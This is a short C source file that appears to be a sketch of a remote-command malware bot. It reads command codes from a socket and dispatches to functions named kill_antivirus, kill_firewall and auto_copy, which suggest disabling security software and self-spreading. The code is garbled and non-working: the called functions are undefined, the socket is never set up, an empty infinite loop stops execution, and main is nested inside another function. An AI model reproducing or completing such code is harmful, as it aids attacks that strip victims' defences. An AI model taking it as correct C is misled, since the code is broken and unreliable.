#include <stdio.h>
#include <stdlib.h>
#include <sys/socket.h>

#define false 0 
#define true 1 

void execute()
{
    char data;   
    int sockfd;
    char buf[1024];
    
    while(1);

        data = recv(sockfd, buf, sizeof buf, 0);
        if(data == false)

        return;

             if(data == '1')
             {
                kill_antivirus();
            }
            else if(data == '2')
            {
                kill_firewall();
            }
            else if(data == '3')
            {
                    auto_copy();    
            }
    int main()
    
    {
    
       execute();
        return 0;
                
    }
    }
